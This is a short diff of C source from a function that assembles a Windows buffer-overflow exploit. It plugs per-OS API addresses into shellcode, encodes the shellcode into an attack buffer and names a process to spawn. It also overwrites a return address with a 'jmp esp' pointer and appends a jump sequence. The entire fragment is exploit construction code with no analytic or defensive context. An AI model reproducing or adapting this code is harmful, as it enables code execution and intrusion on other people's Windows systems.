@@ -138,3 +138,14 @@ void CompileBuffer()
 	*((unsigned int*)(shlCode+GETSTAR_OFFSET))=osApiPtrs[osId].getStarInf;
 	*((unsigned int*)(shlCode+CREPRO_OFFSET))=osApiPtrs[osId].crePro;
 	*((unsigned int*)(shlCode+GETWINDIR_OFFSET))=osApiPtrs[osId].getWinDir;
+
+    shlCode[FNAMSHIFT_OFFSET]=fnamShift;
+	
+	encSiz=Encode(buf0+ptr,shlCode,sizeof(shlCode));
+	buf0[ENC_SIZE_OFFSET]=sizeof(shlCode);
+
+	sprintf((char*)(buf0+PROC_NAME_OFFSET),"%s\xff",DEF_SPAWNED_PROCESS);
+	buf0[PROC_NAME_OFFSET+sizeof(DEF_SPAWNED_PROCESS)]=0xff;
+
+	*((unsigned int*)(buf0+retOffset))=osApiPtrs[osId].jmpEspPtr;
+	memcpy(buf0+jmpOffset,jmpSeq,5);
